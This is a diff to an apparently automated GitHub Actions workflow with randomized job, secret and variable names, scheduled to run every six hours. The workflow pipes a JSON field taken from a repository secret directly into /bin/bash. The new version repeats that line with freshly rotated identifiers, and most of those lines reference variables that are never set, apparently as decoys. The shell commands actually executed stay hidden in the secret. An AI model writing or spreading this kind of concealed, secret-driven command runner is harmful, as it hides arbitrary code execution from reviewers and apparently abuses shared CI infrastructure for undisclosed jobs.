@@ -3,7 +3,7 @@ name: zhuweixi6981
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
+    - cron: '50 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,25 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhuweixi6981
         env:
-          uh3: ${{ secrets.uh3 }}
+          eaoli9: ${{ secrets.eaoli9 }}
         run: |
-          echo $uh3 | jq -r .fh9 | /bin/bash
-          echo $pi399 | jq -r .vgvfl89 | /bin/bash
-          echo $h7 | jq -r .f6 | /bin/bash
-          echo $x1524 | jq -r .rtg9 | /bin/bash
-          echo $i26166 | jq -r .ofj699 | /bin/bash
-          echo $ld05 | jq -r .gfruc12 | /bin/bash
-          echo $rs943 | jq -r .a38 | /bin/bash
-          echo $cuxxk37 | jq -r .ubrd507 | /bin/bash
-          echo $tz64032 | jq -r .p2471 | /bin/bash
-          echo $h0 | jq -r .stz29 | /bin/bash
-          echo $cky68887 | jq -r .k394 | /bin/bash
-          echo $jzvtr0027 | jq -r .pz0 | /bin/bash
-          echo $v4430 | jq -r .atkwo53664 | /bin/bash
-          echo $lzhnl8388 | jq -r .uvk6 | /bin/bash
-          echo $jjsr1 | jq -r .nzmf9716 | /bin/bash
-          echo $bxke69 | jq -r .x367 | /bin/bash
-          echo $flsx7567 | jq -r .x3228 | /bin/bash
-          echo $xss2270 | jq -r .h7 | /bin/bash
-          echo $rttxt40156 | jq -r .j2835 | /bin/bash
+          echo $eaoli9 | jq -r .uuv5 | /bin/bash
+          echo $aa851 | jq -r .suo1201 | /bin/bash
+          echo $uhwz79 | jq -r .n801 | /bin/bash
+          echo $y982 | jq -r .lr501 | /bin/bash
+          echo $auwmx68 | jq -r .zfckz10295 | /bin/bash
+          echo $lc5768 | jq -r .dqw15 | /bin/bash
+          echo $zfc864 | jq -r .kpb33 | /bin/bash
+          echo $kvf792 | jq -r .j7032 | /bin/bash
+          echo $v2 | jq -r .r28 | /bin/bash
+          echo $bb45 | jq -r .jfla8 | /bin/bash
+          echo $gp84 | jq -r .dxogp68718 | /bin/bash
+          echo $qeapd0 | jq -r .uxzt11 | /bin/bash
+          echo $bs19 | jq -r .pf81 | /bin/bash
 
